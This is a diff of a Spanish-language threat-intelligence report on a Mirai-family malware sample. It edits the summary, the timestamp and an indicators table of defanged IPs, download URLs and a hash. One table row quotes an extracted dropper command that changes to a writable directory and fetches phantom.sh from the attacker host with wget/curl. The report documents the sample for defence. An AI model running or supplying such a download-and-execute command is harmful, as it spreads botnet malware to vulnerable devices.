@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se registraron 2 detecciones YARA válidas. Se asoció 1 comando observado o extraído.
+Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos. 2 detecciones YARA válidas respaldan el análisis.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai** con evidencia suficiente para atribuci
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:34:01+00:00`
+- **Registrado:** `2026-08-09T19:34:01.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,12 +54,12 @@ Artefacto asociado a la familia **mirai** con evidencia suficiente para atribuci
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 91.92.42.XXX | static_analysis |
 | url | hxxp://91.92.42.XXX/bins/phantom.x86 | strings |
 | url | hxxp://91.92.42.XXX/phantom.sh | strings |
 | url | hxxp://91.92.42.XXX/phantom.sh; | strings |
-| hash | 7ffb5289d2eaef8369340c0628cfba7f1026250c4fb585ef71d304c610077acb | static_analysis |
+| ip | 91.92.42.XXX | static_analysis |
 | command | [4hroot@db12-web01:~# cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://91.92.42.XXX/phantom.sh; curl - | strings |
+| hash | 7ffb5289d2eaef8369340c0628cfba7f1026250c4fb585ef71d304c610077acb | static_analysis |
 | ip | [internal-ip-redacted] | artifact_source |
 
 ## 🧬 Detecciones YARA
